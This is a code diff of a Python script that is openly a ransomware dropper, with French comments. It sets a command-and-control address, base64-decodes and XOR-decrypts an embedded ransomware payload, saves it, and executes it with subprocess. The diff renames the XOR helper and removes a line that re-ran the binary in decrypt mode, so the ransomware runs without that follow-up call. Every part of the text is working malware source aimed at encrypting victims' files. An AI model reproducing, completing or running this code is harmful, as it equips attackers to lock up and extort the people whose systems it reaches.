@@ -3,7 +3,7 @@ import os
 import requests
 import subprocess
 import sys
-from xorcrypt import xorcrypt
+from xor_crypt import xor_crypt
 import signal
 
 CNC_ADDRESS = "cnc:6666"
@@ -25,7 +25,7 @@ def decode_and_save_ransomware(encoded_ransomware: str, encoded_key: str):
     decoded_ransomware = base64.b64decode(encoded_ransomware)
     decoded_key = base64.b64decode(encoded_key)
     
-    decrypted_ransomware = xorcrypt(decoded_ransomware, decoded_key)
+    decrypted_ransomware = xor_crypt(decoded_ransomware, decoded_key)
 
     #create folder if not exist
     os.makedirs(os.path.dirname('usr/local/bin'), exist_ok=True)
@@ -58,8 +58,6 @@ def main():
     if len(sys.argv) != 2:
         # Lancer le ransomware installé
         subprocess.run(OUTPUT_FILE)
-        # Lancer le ransomware installé avec des arguments
-        subprocess.run([OUTPUT_FILE, "--decrypt"])
     else:
         # Lancer le ransomware installé avec des arguments
         subprocess.run([OUTPUT_FILE, sys.argv[1]])
